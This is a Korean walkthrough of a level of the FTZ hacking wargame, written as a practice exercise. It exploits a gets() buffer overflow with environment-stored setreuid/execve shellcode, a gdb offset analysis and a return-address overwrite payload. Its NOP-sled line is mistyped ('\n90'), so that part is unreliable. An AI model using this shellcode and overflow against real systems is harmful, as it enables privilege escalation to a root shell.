# FTZ Level19

#### ID : level19 PW: king poetic
<br>

우선 hint의 내용을 보자<br>
```cat hint```<br>
```c
#include <stdio.h>

main()
{
      char buf[20];
      gets(buf);
      printf("%s\n", buf);
}
```
전 단계와 비교하면 엄청 간단해졌다.!!!<br>
하지만 setreuid 함수가 없으므로 주로 사용하던 25byte 쉘코드가 아닌 setreuid가 포함된 41byte 쉘코드를 사용하자.<br>

우리의 목적을 생각해보자.<br>
1. buf 위치 찾기
2. 쉘 코드 환경변수 등록 후 주소 확인
3. ret 환경변수 주소로 덮기
3. 공격!


이제 쉘 코드를 등록하고 주소를 찾아보자.<br>
\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80<br>

```export shellcode=$(python -c 'print "\n90"*20+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')```<br>
vi에디터를 이용해 쉘 코드의 주소값을 받아오는 코드를 작성한다.<br>
```vi shell.c```<br>
```c
#include <stdio.h>

int main()
{
    printf("%p\n", getenv("shellcode"));
    return 0;
}
```
```
gcc -o shell shell.c
./shell
```
만든 코드를 실행시키면 쉘 코드의 주소값을 알 수 있다.<br>
필자의 경우 0xbffffc78이 나왔다.<br>

attackme 파일을 tmp로 옮기고 디버깅을 해보자<br>
```
gdb -q attackme
set disassembly-flavor intel
disas main
```
<main+9>를 보면 buf의 위치는 ebp로부터 40만큼 떨어져있다는 것을 알 수 있다.<br>
따라서 sfp 4byte를 포함해 44byte를 채우고 쉘 코드 주소로 덮으면 된다.<br>

그렇다면 우리가 작성할 페이로드는 다음과 같다고 할 수 있다.<br>

**이제 페이로드를 작성해보자.**<br>
```(python -c 'print "A"*44+"\x78\xfc\xff\xbf"';cat)|./attackme```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "A"*44+"\x78\xfc\xff\xbf"';cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level20 Password is "~~". 라고 나올 것이다!!
